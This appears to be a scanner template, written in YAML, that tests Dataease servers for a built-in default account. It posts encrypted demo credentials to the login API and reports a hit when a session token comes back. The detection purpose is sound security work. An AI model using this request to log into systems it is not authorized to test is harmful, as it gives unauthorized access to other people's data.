id: dataease-default-login
name: Dataease - Default Login
severity: high
confidence: confirmed
description: 'Dataease has a built-in account demo/dataease, and many developers forget to delete or change the account password.

  As a result, many Dataease can log in with this built-in account.'
reference: https://github.com/dataease/dataease/issues/5995
tags:
- default-login
- dataease
- vuln
requests:
- method: POST
  path: /api/auth/login
  matchers:
  - type: body
    words:
    - '"success":true'
    - '"token":'
  - type: status
    status:
    - 200
  condition: and
  headers:
    Content-Type: application/json
  body: "{\n  \"username\": \"HmFJtDmMa9MZjlWEpCNAo7Yh/hRBI7mrCRfFTok7wES7qcpIJ04x0OQXW5fwtL4WtN29408wyAupmtMjvvXjag==\",\n\
    \  \"password\": \"sL+oQsnErJMYGiLyzXj/Hy2opaZcSnfjGtYtm48q8tdkkINxzTtAOFI2NgDoorchFE790vWQYIgo1CMyjJ2jnw==\",\n  \"loginType\"\
    : 0\n}\n"
